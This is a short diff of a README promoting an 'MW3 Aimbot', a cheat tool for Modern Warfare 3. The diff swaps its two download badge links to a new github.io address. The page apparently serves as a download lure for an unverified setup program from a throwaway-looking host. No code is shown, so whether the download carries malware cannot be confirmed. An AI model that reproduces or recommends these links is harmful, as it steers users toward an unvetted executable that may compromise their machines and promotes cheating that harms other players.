@@ -1,7 +1,7 @@
 # 🎯 MW3 Aimbot — External Overlay Aim Assistant for Modern Warfare 3
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-slategray?style=for-the-badge)](https://cod-modern-warfare-3-aimbot.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkred?style=for-the-badge&logo=call-of-duty)](https://cod-modern-warfare-3-aimbot.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-slategray?style=for-the-badge)](https://modern3warfarewebcod44.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkred?style=for-the-badge&logo=call-of-duty)](https://modern3warfarewebcod44.github.io/.github/)
 
 ---
 
